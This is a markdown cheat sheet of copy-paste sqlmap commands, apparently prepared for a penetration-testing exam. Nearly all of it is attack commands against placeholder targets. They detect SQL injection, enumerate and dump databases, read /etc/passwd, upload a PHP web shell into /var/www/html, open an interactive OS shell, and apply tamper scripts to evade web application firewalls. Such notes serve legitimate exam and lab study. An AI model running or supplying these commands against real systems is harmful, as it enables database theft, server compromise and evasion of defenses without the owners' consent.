# 13 SQLi — copy-paste commands

> `--batch` = accept all defaults (critical for exam speed). `-v 3` for verbose payload display.

## 1. Basic confirm — GET parameter

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch
```

Sqlmap will print something like:
```
[*] Parameter 'id' is vulnerable. Type: boolean-based blind
```

## 2. List databases

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch --dbs
```

## 3. List tables in a specific DB

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch -D <DB> --tables
```

## 4. List columns in a table

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch -D <DB> -T <TABLE> --columns
```

## 5. Dump the table

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch -D <DB> -T <TABLE> --dump
```

## 6. Dump everything (slow but thorough)

```bash
sqlmap -u "http://<IP>/page.php?id=1" --batch --dump-all
```

## 7. POST / form — capture in Burp first

1. In Burp → Proxy → History → right-click request → **Copy to file** → save as `req.txt`.
2. Then:
   ```bash
   sqlmap -r req.txt --batch --dbs
   sqlmap -r req.txt --batch -D <DB> --tables
   sqlmap -r req.txt --batch -D <DB> -T <TABLE> --dump
   ```

## 8. Specify the injectable parameter explicitly

```bash
sqlmap -u "http://<IP>/login.php" --data "user=admin&pass=test" -p user --batch
```

## 9. Authenticated (cookie required)

```bash
sqlmap -u "http://<IP>/dashboard.php?id=1" \
  --cookie="PHPSESSID=abcdef1234" \
  --batch --dbs
```

## 10. Bump level / risk when nothing is found

```bash
sqlmap -u "<URL>" --level=5 --risk=3 --batch
```

- `--level` 1–5 = how many payloads (default 1)
- `--risk` 1–3 = how dangerous (default 1, may UPDATE rows at risk 3)

## 11. Force a specific DBMS / technique

```bash
sqlmap -u "<URL>" --dbms=mysql --technique=BEUSTQ --batch
# B=Boolean E=Error U=Union S=Stacked T=Time Q=Inline
```

## 12. Read a file from the OS

```bash
sqlmap -u "<URL>" --batch --file-read=/etc/passwd
```

## 13. Write a file (upload a shell)

```bash
sqlmap -u "<URL>" --batch --file-write=shell.php --file-dest=/var/www/html/shell.php
```

## 14. Interactive OS shell

```bash
sqlmap -u "<URL>" --batch --os-shell
```

Works mostly on MySQL when the DB user has `FILE` privilege and you know the webroot.

## 15. Tamper scripts to bypass WAFs

```bash
sqlmap -u "<URL>" --batch --tamper=space2comment,between,randomcase
sqlmap --list-tampers                          # see what's available
```

## Quick POST data inline (no req.txt)

```bash
sqlmap -u "http://<IP>/login.php" \
  --data="username=admin&password=test" \
  --batch --dbs
```
